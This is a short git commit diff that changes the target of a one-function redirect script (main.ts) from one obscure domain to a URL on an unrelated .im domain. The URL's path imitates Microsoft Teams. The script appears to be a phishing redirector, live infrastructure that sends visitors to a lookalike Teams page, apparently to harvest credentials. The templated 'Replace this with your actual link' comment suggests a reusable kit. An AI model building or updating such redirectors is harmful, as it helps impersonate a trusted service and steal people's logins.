6e9409f9cf65f4da1d57fccbcd76c265f7cf9a6e
Digital2025001 <bosmichael30@gmail.com>
2025-11-14 17:35:48 -0600

    Update redirect URL in main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://3la6ol.net/", // Replace this with your actual link
+      Location: "https://03nteams0kly.im/msteams/teamsn/teams/", // Replace this with your actual link
     },
   });
 });
